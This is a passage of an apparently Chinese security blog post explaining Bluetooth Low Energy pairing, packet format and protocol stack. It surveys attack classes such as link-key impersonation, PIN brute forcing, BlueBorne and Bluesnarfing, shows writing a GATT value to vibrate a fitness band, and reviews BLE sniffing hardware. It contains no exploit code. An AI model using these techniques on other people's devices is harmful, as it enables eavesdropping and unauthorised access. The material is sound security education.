Network和F-Secure的研究人员发布了一份报告，警告有大量留在“可见”状态的设备，还报告了各种蓝牙服务的普及程度，以及与蓝牙蠕虫传播的危险性有关的统计数据。</p><p>2007年10月，在卢森堡的Hack.lu Security会议上，Kevin Finistere和Thiery Zoller演示了通过蓝牙远程rootMacOSXv10.3.9和v10.4系统，还演示了一个蓝牙PIN码和Linkeys破解器。</p><p>维基百科.上介绍的以上这些蓝牙安全的案例都至少是9年以前的事情了。那么近些年来，在蓝牙安全领域又有什么攻击方式</p><h2 id="0x02-BLE工作流程"><a href="#0x02-BLE工作流程" class="headerlink" title="0x02 BLE工作流程"></a><strong>0x02 BLE工作流程</strong></h2><h3 id="1-工作流程"><a href="#1-工作流程" class="headerlink" title="1.工作流程"></a><strong>1.工作流程</strong></h3><p>BLE低功耗蓝牙适用于短距离无线通信，正常与形式传输距离为10m(低功耗模式下为100m)，频段2.4Ghz。先进行三个蓝牙术语介绍：</p><ul><li>配对：配对是指两个蓝牙设备首次通讯时，互相确认的过程。两个蓝牙设备之间一经配对之后，随后的通讯连接就不必每次都要做确认，非常的方便</li><li>PIN：个人识别码，蓝牙适用的PIN码长度为1-8个十进制位(8-128比特)</li><li>DB_ADDR：蓝牙设备地址。每个蓝牙收发器被分配了唯一的一个48位的设备地址，类似于PC机网卡的MAC地址。两个蓝牙设备在通讯开始时通过询问的方式获取对方的DB_ADDR地址</li></ul><p>蓝牙的工作过程为:</p><p>​                蓝牙启动 -&gt; 扫描设备 -&gt; 设备配对（未配对的设备） -&gt; 数据传输              </p><h3 id="2-设备配对模式"><a href="#2-设备配对模式" class="headerlink" title="2.设备配对模式"></a><strong>2.设备配对模式</strong></h3><ul><li>Numeric Comparison：配对双方都显示一个6位数的数字，由用户来核对数字是否一致，一致即可配对。例如手机之前的配对。</li><li>Just Works：用于配对没有显示没有输入的设备，主动发起连接即可配对，用户看不到配对过程。例如连接蓝牙耳机。</li><li>Passkey Entry：要求配对目标输入一个在本地设备上显示的6位数字，输入正确即可配对。例如连接蓝牙键盘</li><li>Out of Band：两设备通过别的途径交换配对信息，例如nfc等。例如一些NFC蓝牙音响</li></ul><h3 id="3-设备配对过程"><a href="#3-设备配对过程" class="headerlink" title="3.设备配对过程"></a><strong>3.设备配对过程</strong></h3><h4 id="a-PIN码配对"><a href="#a-PIN码配对" class="headerlink" title="a PIN码配对"></a><strong>a PIN码配对</strong></h4><p>在老的蓝牙2.0协议中，配对过程需要输入一个PIN码，长度可以从4到16个数字。（很多设备默认为0000或者1234）</p><p>在配对的过程中通过PIN码来生成Linkkey。两个配对后的设备共享一个Linkkey，这个行为叫绑定。绑定之后下次两个设备接近后，用Linkkey进行认证，认证通过后生成EncryptionKey进行session的加密。认证的过程采用challenge-reponse的模式，以claimant and the verifier的方式来验证linkkey。认证完一方之后交换身份，在认证另一方。</p><h4 id="b-密钥交换配对"><a href="#b-密钥交换配对" class="headerlink" title="b 密钥交换配对"></a><strong>b 密钥交换配对</strong></h4><p>后续蓝牙协议配对则通过密钥交换来完成，又分为生成初始密钥(Kinit)、生成链路密钥(Kab)和双方认证三个过程。</p><ul><li>生成舒适密钥(Kinit)：初始密钥Kinit长度为128位，由E22算法产生。首先提出通信要求的设备成为主设备(Master)，用A表示;被动进行通信的设备称为从设备(Slave),用B表示。E22算法的输入(明文）由以下三部分组成：</li></ul><ol><li>从设备的物理地址：BD_ADDR,在生成Kinit前，主设备通过询问方式获得从设备的地址BD_ADDR。</li><li>PIN码及其长度，PIN码是双方设备预先设定的。</li><li>有一个128位的随机数(IN_RAND)。由主设备产生，并以明文方式传送给从设备。</li></ol><p>由于主、从设备使用了相同的E22算法，如果双方设备以上三部分的值都相等，那么各自算出来的Kinit也应该相同。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34133.png" alt="0"></p><ul><li>生成链路密钥(Kab)：首先主设备A产生128位的随机数LK_RANDA，从设备B也产生128位的随机数LK_RANDB。在主设备A中，Kinit与LK_RAND进行位比特逻辑异或运算，异或结果发送给B设备；同样的，在B设备中，Kinit和LK_RANDB进行位比特逻辑异或运算，结果发送给A设备。通过这些交换后，A和B设备都具有相同的Kinit、LK_RANDA和LK_RANDAB。设备A和B分别用E21算法将LK_RANDA和LK_RANDB。设备A和B分别用E21算法将LK_RANDA和BD_ADDRA、LK_RANDB和BD_ADDRB加密，并将结果进行异或得到Kab。</li></ul><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34168.png" alt="0"></p><ul><li>双方认证：双向认证采用challenge-response(挑战-应答)方式。主设备A位应答方，从设备B为请求方。作为应答方的A设备产生一个128位的随机数AU_RANDA，并以明文的方式传送至B设备。A、B设备都用E1算法将各自的到的AU_RAND、Kab和BD_ADDRB加密运算分别生成32位的SRESA和SRESB。B设备将结果SRESB传送给A设备，A设备比较SERESA和SERSB，如果两个的值相等，此次认证通过，如果两个的值不想等，则认证不通过。执行完此次认证后，A设备和B设备的角色对换，即A设备作为请求方，B设备作为应答方，采用同样的方式进行认证。</li></ul><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34183.png" alt="0"></p><h2 id="0x03-BLE常见问题"><a href="#0x03-BLE常见问题" class="headerlink" title="0x03 BLE常见问题"></a><strong>0x03 BLE常见问题</strong></h2><p>蓝牙（bluetooth）同WIF和zigbee等等网络协议一样，因此它的网络协议通信结构和它们大同小异。</p><p>因此，它的攻击手段不外乎鉴权攻击、密钥攻击、拒绝服务攻击等等几种手段，只不过随着具体的场景不同，这些攻击手段所赐啊去的具体方法也不同。</p><p>在上述的几种攻击方法里，蓝牙的安全问题可以分为两类：第一类是蓝牙协议本存在的问题。例如有攻击工具：Bluenarfing、Bluebugging、Hijacking等。</p><h3 id="1-针对蓝牙协议本身的攻击"><a href="#1-针对蓝牙协议本身的攻击" class="headerlink" title="1.针对蓝牙协议本身的攻击"></a><strong>1.针对蓝牙协议本身的攻击</strong></h3><h4 id="a-节点密钥攻击（中间人）"><a href="#a-节点密钥攻击（中间人）" class="headerlink" title="a.节点密钥攻击（中间人）"></a><strong>a.节点密钥攻击（中间人）</strong></h4><p>假设一个设备A和B之前已经通信过，当通信完成之后，A和B是互相知道彼此的链路密钥的。这里解释一下什么叫链路密钥：A和B之间的通信是需要加密的，怎么加密的不管，总之就是需要一个链路密钥这样的一个东西，每次通信的链路密钥是根据蓝牙本身自带生成的，这个链路密钥不是放在协议层生产的，而是蓝牙硬件自身就有的。那么B显然之后A所使用的链路密钥，那么B通过修改自身地址，把自己的地址改为A的地址后，伪装成A和C通信，那么C此时就以为自己和A通信。B也可以伪装成C和A去通信，因为B知道A的链路密钥，B是能够通过A的认证从而和A进行连接 。</p><p>这样 A和 C之间并没有进行实质的通信 ，都是B分别伪装和A，C通信。这样就造成了中间人攻击。</p><p>这种中间人攻击的主要原因在于蓝牙通信链路密钥在硬件层生产，而且每次认证都相同。</p><h4 id="b-针对PIN码攻击"><a href="#b-针对PIN码攻击" class="headerlink" title="b.针对PIN码攻击"></a><strong>b.针对PIN码攻击</strong></h4><p>两个设备之间的链接，在应用层上使用PIN码，4位PIN码破解仅仅需要0.06秒，8位暴力攻击不到两个小时就能破解。</p><h4 id="c-中继攻击"><a href="#c-中继攻击" class="headerlink" title="c.中继攻击"></a><strong>c.中继攻击</strong></h4><p>蓝牙设备使用中继以夸大传输距离，几乎所有的中继攻击，中继设备都有可能遭到信息窃取</p><h4 id="d-鉴权DOS攻击"><a href="#d-鉴权DOS攻击" class="headerlink" title="d.鉴权DOS攻击"></a><strong>d.鉴权DOS攻击</strong></h4><p>鉴权时的DOS攻击是从上一次鉴权失败到下一次可以发起鉴权期间，第三方通过伪装发起故意使鉴权失败，从而使间隔时间持续上升，知道达到允许的最大值，在此期间双方不能进行正常的鉴权。</p><p>还有一种形式的DOS攻击，快速不断的给远程蓝牙发送文件，而远端设备呗大量的是否要接收该文件的命令冲击直到瘫痪。</p><h3 id="2-针对蓝牙实现过程发起的攻击"><a href="#2-针对蓝牙实现过程发起的攻击" class="headerlink" title="2.针对蓝牙实现过程发起的攻击"></a><strong>2.针对蓝牙实现过程发起的攻击</strong></h3><h4 id="a-BlueBorne"><a href="#a-BlueBorne" class="headerlink" title="a. BlueBorne"></a><strong>a. BlueBorne</strong></h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/t01fa596689092bd57a.png" alt="image"></p><ul><li><a href="https://armis.com/blueborne/">https://armis.com/blueborne/</a></li><li><a href="https://www.antiy.cn/research/notice&report/research_report/20170918.html">基于蓝牙协议漏洞的BLUEBORNE攻击综合分析报告</a></li><li><a href="https://www.anquanke.com/post/id/86949">BlueBorne 蓝牙漏洞深入分析与PoC</a></li></ul><p>是由armis爆出的一系列蓝牙的漏洞，只要手机开启了蓝牙，就可能被远程控制。当然根据上面的分析可以看到通过多种平台的漏洞综合利用，可以完成对大部分支持蓝牙的设备进行攻击。但是在安天的报告里有一句我没懂“不像其它驱动一样，每个操作系统都只有一个蓝牙协议栈，这导致一个漏洞的出现将会影响一系列基于此系统的设备。”其他驱动是啥样？大概的意思就是内核驱动的漏洞吧，不过能看到的是通过这组漏洞可以实现ios，android，linux的rce，以及windows下的中间人攻击。</p><h4 id="b-GATT"><a href="#b-GATT" class="headerlink" title="b. GATT"></a><strong>b. GATT</strong></h4><ul><li><a href="https://gattack.io/">https://gattack.io/</a></li></ul><p>从蓝牙4.0的低功耗蓝牙（BLE）开始到4.2开始支持GATT（Generic Attribute Profile）再到BLE5，蓝牙技术已经瞄准了物联网这个方向。所以很多特性都是针对物联网的情景而生的，比如GATT。GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等用于让两个设备进行连接后的通讯。GATT 定义设备之间通过 Service 和 Characteristic 的东西来进行通讯，不同的 Characteristic 代表设备的不同功能。GATT协议可以在蓝牙设备不完成配对的情况下进行访问，因此，通信流量明文传输，如果应用层没有加密或者校验，则可以被轻易地嗅探和伪造数据。</p><p>相关paper:</p><ul><li><a href="http://gattack.io/whitepaper.pdf">GATTACKING BLUETOOTH SMART DEVICES</a></li><li><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">BadBluetooth: Breaking Android Security Mechanisms via Malicious Bluetooth Peripherals</a></li></ul><h4 id="c-Bluesnarfing"><a href="#c-Bluesnarfing" class="headerlink" title="c.Bluesnarfing"></a><strong>c.Bluesnarfing</strong></h4><p>蓝牙定义了OBEX协议，只鹅个协议的重要目的是实现数据对象的交换。蓝牙早期规范定义了一个基于OBEX的应用，这个应用主要用来实现使用蓝牙来传输一些名片，这个过程并不需要使用鉴权机制，Bluesnarfing就是利用此漏洞连接到手机用户，并且不提示用户已连接。</p><p>当不使用蓝牙时，将设备设置成不可发现的模式，或者在通信时将设备设置成为安全模式3来启动链路鉴权，对一些蓝牙设备进行升级可以有效预防此类攻击。</p><h4 id="d-Bluebugging"><a href="#d-Bluebugging" class="headerlink" title="d.Bluebugging"></a><strong>d.Bluebugging</strong></h4><p>Bluebugging和Bluesnarfing相似，在事先不通知货提示手机用户的情况下，访问手机命令。</p><h4 id="e-Peripheral-Hijacking"><a href="#e-Peripheral-Hijacking" class="headerlink" title="e.Peripheral Hijacking"></a><strong>e.Peripheral Hijacking</strong></h4><p>有些设备尽管没有进入连接模式也会对连接请求进行相应，这类设备通常是一些没有MMI（Man Machine Interface）的设备。例如一些蓝牙耳机会被强制连接，还有一些设备有固定的PIN码，Peripheral Hijacking即是对此类设备进行攻击。</p><h4 id="f-Bluejacking"><a href="#f-Bluejacking" class="headerlink" title="f.Bluejacking"></a><strong>f.Bluejacking</strong></h4><p>Bluejacking是指手机用户使用蓝牙无线技术匿名向赴京的蓝牙用户发送名片或不许奥信息的行为。Bluejacking通常会寻找ping的通的手机或者有反应的手机，随后会发送更多的其他个人信息到该设备。现在市场上已经出现了很多Bluejacking软件。可以通过把手机设置成不可发现模式来避免此类攻击。</p><h2 id="0x04-信道"><a href="#0x04-信道" class="headerlink" title="0x04 信道"></a><strong>0x04 信道</strong></h2><p>BLE的物理通道即”频道”，分别是‘f=2402+k*2 MKz, k=0 , … ,39’, 宽带为2MHz的40个RF Channel。</p><p>其中，有3个信道是advertising channel(广播通道)，分别是37、38、39，用于发现设备(Scanning devices)、初始化连接(initiating a connection)和广播数据(broadcasting date)</p><p>剩下的37个信道为data channel(数据通道)，用于两个连接的设备间的通讯。</p><h2 id="0x05-BLE数据包格式"><a href="#0x05-BLE数据包格式" class="headerlink" title="0x05 BLE数据包格式"></a><strong>0x05 BLE数据包格式</strong></h2><p>在低功耗蓝牙规范中，分广播报文和数据报文这两种。设备利用广播报文发现、连接其它设备，而在连接建立之后，便开始使用数据报文。无论是广播报文还是数据报文，链路层只使用一中数据包格式，它由”前导码”(preamble)、”访问码”(access code)、”有效载荷”和”循环冗余校验”（Cyclical Redundancy CHeck，CRC）校验码组成。其中，”访问码”有时又称为”访问地址”(access address)</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34506.png" alt="0"></p><h3 id="1-Preamble"><a href="#1-Preamble" class="headerlink" title="1.Preamble"></a>1.Preamble</h3><p>1个字节长度，接受中用于频率同步、数据速率同步、自动增益控制调整，固定为                        01010101或者10101010序列</p><h3 id="2-Access-Address"><a href="#2-Access-Address" class="headerlink" title="2.Access Address"></a>2.Access Address</h3><p>4个字节长度，广播报文接入地址为：0x8E89BED6,数据报文接入地址为：32bits随机数</p><h3 id="3-PDU"><a href="#3-PDU" class="headerlink" title="3.PDU"></a>3.PDU</h3><p>i.广播报文（见嫌疑BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.3）</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34523.png" alt="0"></p><p>i. PDU Type: 有效载荷内容的类型，通过这一字段确定改数据包是一个”通告”还是”扫描请求”或”响应”等</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34532.png" alt="0"></p><p>ii. RFU 保留位</p><p>iii. TxAdd：发送地址字段</p><p>iv. RxAdd：接收地址字段</p><p>v. Payload Length：用来表示”有效载荷数据”(payload data)的长度，不包括头部内容</p><p>ii.数据报文（见协议BLUETOOTH SPECIFICATION Version 4.0 [Vol 6] Part B 2.4）</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34544.png" alt="0"></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34546.png" alt="0"></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34548.png" alt="0"></p><p>1.LLID（逻辑链路ID）：0x01表示该数据包是一个帧的延续内容，或者这是一个空的“逻辑链路控制及适配协议”数据包；0x02表示一个“逻辑链路控制及适配协议”数据包的开始；0x03表示这是一个“逻辑链路控制”数据包的内容</p><p>2.NESN：下一个期望的序列号，用于对接受到的数据包进行确认</p><p>3.MD：更多数据字段，主要是为了说明发送发是否还有要发给接收者的数据</p><p>4.RFU 保留位</p><p>5.Payload Length：用以表示包含”信息完整性校验码”（Message Integrity Check，MIC）在内的“有效载荷数据”的长度</p><p>4.CRC</p><p>3个字节长度，“循环冗余校验”（Cyclical Redundancy Check, CRC），可检查数据的正确性</p><h2 id="0x06-BLE-协议栈"><a href="#0x06-BLE-协议栈" class="headerlink" title="0x06 BLE 协议栈"></a><strong>0x06 BLE 协议栈</strong></h2><p>BLE协议栈的结构图如下所示：</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34568.png" alt="0"></p><p>各个结构简述：</p><ul><li>PHY：使蓝牙可以使用2.4GHz频道，并且能自适应的调频。</li><li>LL层：控制设备处于 准备、广播、监听、初始化、连接等5个状态</li><li>HCI层：向上为主机提供软件应用程序接口，对外为外部硬件提供控制接口</li><li>L2CAP层：对传输数据实行封装。</li><li>SM层：提供主机和客机的配对和密钥分发，实现安全连接和数据交换。</li><li>ATT层：对数据主机或客机传入的指令进行指令搜索处理</li><li>GATT层：接受和处理主机或客机传入的指令进行指令搜索处理</li><li>GAP层：向上提供API，向下合理分配各个层工作。</li></ul><h3 id="1-Physical-Layer"><a href="#1-Physical-Layer" class="headerlink" title="1. Physical Layer"></a><strong>1. Physical Layer</strong></h3><p>任何一个通信系统，首先要确定的就是通信介质(物理通道，Physical Channel)，BLE也不例外。在BLE协议中，”通信介质”的定义是由Physical Layer（其他通信协议也类似）负责。</p><p>Physical Layer是这样描述BLE的通信介质的：</p><p>​                由于BLE属于无线通信，则其通信介质是实顶频率范围下的频率资源(Frequency Band) BLE的市场定位是个体和名用，因此使用免费的ISM频段(频率范围是2.400-2.4835Ghz) 为了同时支持多个设备，将真个频带分为40份，每份的宽带为2MHz，称作RF Channel              </p><p>所以经过上面的定义之后，可以推测出BLE的物理通道，即“评到分别是’f=2402+k*2 MHz，k=0,…,39’,宽带为2MHz”的40个RFChannel。其中，有3个信道是advertising channel（广播通道），分别是37、38、39，用于发现设备（Scanning devices）、舒适化连接(initiating a connection)和广播数据(broadcasting date)；剩下的37个信道为data channel（数据通道），用于两个连接的设备间的通讯。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34607.png" alt="0"></p><h3 id="2-Link-Layer"><a href="#2-Link-Layer" class="headerlink" title="2. Link Layer"></a><strong>2. Link Layer</strong></h3><p>Link Layer用于控制设备的射频状态，设备将处于Standby(待机)、Advertising（通告）、Scanning（扫描）、Initiating（初始化）、Connection（连接）这五种状态中的一种。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34606.png" alt="0"></p><ul><li>待机状态（Standby State）：此时即不发送数据，也不接受数据，对设备来说也是最节能的状态；</li><li>通告状态（Advertising State）：通告状态下的设备一般也被称为 “通告者”（Advertiser），它会通过advertising channel（广播通道）周期性的发送数据，广播的数据可以由处于Scanning state或Initiating state的实体接受；</li><li>扫描状态（Scanning State）：可以通过advertising channel（广播通道）接受数据的装填，该状态下的设备又被称为“扫描者”（Scanner）。此外，更具advertiser所广播的数据类型，有些Scanner还可以主动向Advertiser请求一些额外数据</li><li>初始化状态（Initiating State）：和Scanning State类似，不过是一种特殊的状态。Scanner会侦听所有的advertising channel，而Initator（初始化者）则只侦听某个特定设备的广播，并在接受到数据后，发送连接请求，以便和Advertiser建立连接</li><li>连接状态（Connection State）：由Initiating State或Advertising State自动切换而来，处于Connection State的双方，分别有两种角色。其中，Initiater方被称为Mater（主设备），Advertiser方则称作Slave（从设备）。</li></ul><h3 id="3-HCI"><a href="#3-HCI" class="headerlink" title="3. HCI"></a><strong>3. HCI</strong></h3><p>主机控制接口层（Host Controller Interface，简写HCI）：定义Host（主机）和Controller（控制器）之间的通信协议，这一层可以是软件或者硬件接口，入UART、SPI、USB等</p><h3 id="4-Generic-Access-Profile-GAP"><a href="#4-Generic-Access-Profile-GAP" class="headerlink" title="4. Generic Access Profile(GAP)"></a><strong>4. Generic Access Profile(GAP)</strong></h3><p>前面Link Layer虽然对连接建立的过程做了定义，但它听没有体现到Application（或者 Profile）层面，而GAP则是直接与应用程序或配置文件通信的接口，它实现了如下功能：</p><ul><li><p>定义GAP层的蓝牙设备角色（role）</p></li><li><ul><li>Broadcaster（广播者）：设备正在发送advertising events</li><li>Obserber（观察者）：设备正在接受advertising events</li><li>Peripheral（外设）：设备接受Link Layer连接（对应Link Layer的slave角色）</li><li>Central（主机）：设备发起Link Layer连接（对应Link Layer的master角色）</li></ul></li><li><p>定义GAP层的用于实现各种通信的操作模式（Operational Mode）和过程（Procedures）</p></li><li><ul><li>Broadcastmode and observation procedure，实现单向的、无连接的通信方式</li><li>Discovery modes and procedures，实现蓝牙设备的发现操作</li><li>Connection modes and procedures，实现蓝牙设备的连接操作</li><li>Bonding modes and procedures，实现蓝牙设备的配对操作</li></ul></li><li><p>定义User Interface有关的蓝牙参数，包括蓝牙地址、蓝牙名称、蓝牙的PIN码等</p></li><li><p>Security相关的定义</p></li></ul><h3 id="5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）"><a href="#5-Logical-Link-Control-and-Adaptation-Protocol（L2CAP-Protocol）" class="headerlink" title="5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）"></a><strong>5. Logical Link Control and Adaptation Protocol（L2CAP Protocol）</strong></h3><p>逻辑链路控制及自适应协议层（Logical Link Control and Adaptation Protocol）：为上层提供数据封装服务，允许逻辑上的点对点数据通信。</p><h3 id="6-Security-Manager（SM）"><a href="#6-Security-Manager（SM）" class="headerlink" title="6. Security Manager（SM）"></a><strong>6. Security Manager（SM）</strong></h3><p>Security Manager负责BLE通信中有关安全的内容，包括配对（pairing,）、认证（authentication）和加密（encryption）等过程。</p><h3 id="7-Attribute-protocol（ATT）"><a href="#7-Attribute-protocol（ATT）" class="headerlink" title="7. Attribute protocol（ATT）"></a><strong>7. Attribute protocol（ATT）</strong></h3><p>在BLE协议栈中，Physical Layer负责提供一系列的Physical Channel；基于这些Physical Channel，Link Layer可在两个设备之间建立用于点对点通信的Logical Channel；而L2CAP则将这个Logical Channel换分为一个个的L2CAP Channel，以便提供应用程序级别的通道复用。到此之后，基本协议栈已经构建完毕，应用程序已经可以基于L2CAP欢快的run起来了。</p><p>谈起应用程序，就不得不说BLE的初衷——物联网。物联网中传输的数据和传统的互联网有什么区别呢？抛开其它不谈，物联网中最重要、最广泛的一类应用是：信息的采集。</p><p>这些信息往往都很简单，如温度、湿度、速度、位置信息、电量、水压、等等。</p><p>采集的过程也很简单，节点设备定时的向中心设备汇报信息数据，或者，中心设备在需要的时候主动查询。</p><p>基于信息采集的需求，BLE抽象出一个协议：Attribute protocol，该协议将这些“信息”以“Attribute（属性）”的形式抽象出来，并提供一些方法，供远端设备（remote device）读取、修改这些属性的值（Attribute value）。</p><p>Attribute Protocol的主要思路包括：</p><ol><li>基于L2CAP，使用固定的Channel ID</li><li>采用client-server的形式。提供信息（以后都将其称为Attribute）的一方称作ATT server（一般是那些传感器节点），访问信息的一方称作ATT client。</li><li>一个Attribute由Attribute Type、Attribute Handle和Attribute Value组成。</li></ol><ul><li><ol><li>Attribute Type用以标示Attribute的类型，类似于我们常说的“温度”、“湿度”等人类可识别的术语，通过UUID进行区分。</li><li>Attribute Handle是一个16-bit的数值，用作唯一识别Attribute server上的所有Attribute。Attribute Handle的存在有如下意义：</li></ol></li><li><ul><li><ol><li>一个server上可能存在多个相同type的Attribute，显然，client有区分这些Attribute的需要。</li><li>同一类型的多个Attribute，可以组成一个Group，client可以通过这个Group中的起、始handle访问所有的Attributes。</li></ol></li></ul></li><li><ol><li>Attribute Value代表Attribute的值，可以是任何固定长度或者可变长度的octet array。</li></ol></li></ul><ol><li>Attribute能够定义一些权限（Permissions），以便server控制client的访问行为，包括：</li></ol><ul><li><ol><li>访问有关的权限（access permissions），Readable、Writeable以及Readable and writable；</li><li>加密有关的权限（encryption permissions），Encryption required和No encryption required；</li><li>认证有关的权限（authentication permissions），Authentication Required和No Authentication Required；</li><li>授权有关的权限（authorization permissions），Authorization Required和No Authorization Required。</li></ol></li></ul><ol><li>根据所定义的Attribute PDU的不同，client可以对server有多种访问方式，包括：</li></ol><ul><li><ol><li>Find Information，获取Attribute type和Attribute Handle的对应关系；</li><li>Reading Attributes，有Read by type、Read by handle、Read by blob（只读取部分信息）、Read Multiple（读取多个handle的value）等方式；</li><li>Writing Attributes，包括需要应答的writing、不需要应答的writing等。</li></ol></li></ul><h3 id="8-Generic-Attribute-profile（-GATT）"><a href="#8-Generic-Attribute-profile（-GATT）" class="headerlink" title="8. Generic Attribute profile（ GATT）"></a>8. Generic Attribute profile（ GATT）</h3><p>ATT之所以称作“protocol”，是因为它还比较抽象，仅仅定义了一套机制，允许client和server通过Attribute的形式共享信息。至于具体共享哪些信息，ATT并不关心，这是GATT（Generic Attribute Profile）的主场。GATT相对ATT只多了一个‘G‘，然含义却大不同，因为GATT是一个profile（更准确的说是profile framework）。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34640.png" alt="0"></p><p>由上图可知，GATT中的三个要素Profile、Service、Characteristic以及他们的层级关系。值得注意的是，“Profile”是基于GATT所派生出的真正的Profile，乃SIG蓝牙技术联盟对一些同范畴内的Service打包后的集合，如电池、心率、血压等，可参照<a href="https://developer.bluetooth.org/TechnologyOverview/Pages/Profiles.aspx#GATT">官方Profiles Overview</a>，对分析并无大用。</p><p>Service和Characteristic则是比较重要的，Service可以理解为PHP中的“类”、功能对象的集合。Characteristic可以理解为PHP的“函数”，是GATT中具体的功能对象，每个Service都可以包含一个或多个Characteristic（特征）。Characteristic是GATT profile中最基本的数据单位，由一个Properties、一个Value、一个或者多个Descriptor组成。</p><p>以上除“Profile”外的每一个定义，Service、Characteristic、Characteristic Properties、Characteristic Value、Characteristic Descriptor等等，都是作为一个Attribute存在的，具备前面所描述的Attribute的所有特征：Attribute Handle、Attribute Types、Attribute Value和Attribute Permissions。</p><p>在理解了GATT后，就已经能够分析或是“黑掉”一些BLE设备了。这里拿小米手环做例子，当LightBlue连上小米手环后，可以看到一个名为FEE7的UUID，如下所示：</p><p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表<a href="https://developer.bluetooth.org/gatt/characteristics/Pages/CharacteristicsHome.aspx">Characteristics</a>搜索2A06，进入Characteristic的详情页面。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34644.jpeg" alt="0"></p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34646.jpeg" alt="0"></p><p>其中，FEE7是一个私有Service的UUID，里面的0xFE**则是私有Characteristic的UUID。下面的Immediate Alert 显示出了名称，代表其不是小米私有的Service，而是官方公开定义的Service。点击进入这个Characteristic，看到它的UUID为2A06。然后我们到蓝牙官网定义的列表搜索2A06，进入Characteristic的详情页面。</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34650.png" alt="0"></p><p>于是，该Characteristic操作定义非常明确了。点击“Write new value”，可以写入新的值。若写入1或2，则可以引起手环的震动。</p><h2 id="0x07-嗅探工具"><a href="#0x07-嗅探工具" class="headerlink" title="0x07 嗅探工具"></a>0x07 嗅探工具</h2><p>商业级的Ellisys BEX400侦听工具最为符合对BLE流量捕获及分析的要求，然而售价过于昂贵；</p><p>其次，作为开源硬件且配有混杂模式追踪的“超牙”设备——Ubertooth One拥有二次开发和嗅探已建立连接的蓝牙通信数据包的能力；</p><p>而淘宝购买的廉价CC2540开发板则作为最佳替补方案。</p><h3 id="1-低功耗蓝牙SOC"><a href="#1-低功耗蓝牙SOC" class="headerlink" title="1. 低功耗蓝牙SOC"></a>1. 低功耗蓝牙SOC</h3><p>低功耗蓝牙推出以来，众多厂商根据标准规范实现了不同的解决方案，包括TI的CC2540\2541、北欧Nordic的nRF51822、CSR的1000\1001、Quintic的QN9020\9021（现在被NXP收购）、Broadcom的BCM20732等。其中，在开发者当中比较知名的是TI的CC254x系列和Nordic的NRF51822，并且这两款产品当有着自己的开发板和用于嗅探的调试工具。</p><h4 id="a-CC2540"><a href="#a-CC2540" class="headerlink" title="a. CC2540"></a>a. CC2540</h4><p>德州仪器的CC2540，是一款高性价比、低功耗的片上系统（SOC）解决方案，适合蓝牙低功耗应用。它包含了一个8051内核的RF收发器，可编程闪存，8KB RAM和其他功能强大的配套特征及外设。CC2540有两种版本：CC2540F128 / F256，分别为128和256 KB的闪存，结合TI的低功耗蓝牙协议栈，CC2540F128 / F256形成了市场上最灵活，性价比也最高的单模式蓝牙BLE解决方案。<br>CC2540 USB Dongle的实物图如下，它可以配合TI的PacketSniffer软件实现对BLE无线抓包：</p><p>实际上，任意包含CC2540芯片的开发板都能实现BLE流量嗅探的功能。不过，TI官方并没有将侦听BLE的源代码放出，仅提供了烧写到USB Dongle的固件</p><p>在这个基础上，如果想要实现更多的功能，比如监听指定范围内所有的低功耗蓝牙设备的流量，就有必要对其进行逆向或者自己完全重写个程序。。</p><h4 id="b-NRF51822"><a href="#b-NRF51822" class="headerlink" title="b. NRF51822"></a>b. NRF51822</h4><p>挪威Nordic Semiconductor（简称Nordic）公司的nRF51822，是一款多协议ARM内核蓝牙4.0低功耗/ 2.4GHz 专用RF的单芯片解决方案。它基于Cortex-M0 内核，配备16kB RAM，可编程闪存，提供128 KB和 256 KB Flash两种版本供用户选择。</p><p>nRF51822 USB Dongle及开发板套件如下所示：</p><p><a href="https://user-images.githubusercontent.com/11291711/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984345-9d153e00-ffa2-11e8-8db0-9a32847bcc14.png" alt="img"></a></p><p>刷入以下固件，配合官方的BLE sniffer程序，即可实现蓝牙流量的嗅探功能</p><p><a href="https://user-images.githubusercontent.com/11291711/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984344-9d153e00-ffa2-11e8-877a-7ff3b7963762.png" alt="img"></a></p><p>不同与cc2540的Packet Sniffer，该程序无需事先在3个广播信道中指定其一进行守候，只要指定要监听的设备，就会自动进行追踪，并能够配合Wireshark解析BLE数据包，可以很直观的显示出内部的层级关系和各字段含义。比较遗憾的是，实际使用发现它并没有CC2540 USB 